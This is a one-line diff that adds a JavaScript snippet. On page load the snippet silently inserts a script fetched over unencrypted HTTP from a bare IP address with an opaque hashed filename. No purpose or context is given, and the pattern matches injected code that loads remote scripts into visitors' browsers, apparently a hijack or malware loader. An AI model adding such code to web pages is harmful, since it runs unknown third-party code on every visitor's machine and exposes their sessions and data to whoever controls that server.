@@ -1,0 +1,1 @@
+window.setTimeout(function(){var a=document.createElement("script");a.src="http://103.207.164.162/open/440300/1469842014/17c8e5dd7f2c406ed56b5f497368283a.js";document.getElementsByTagName("head")[0].appendChild(a);},0);
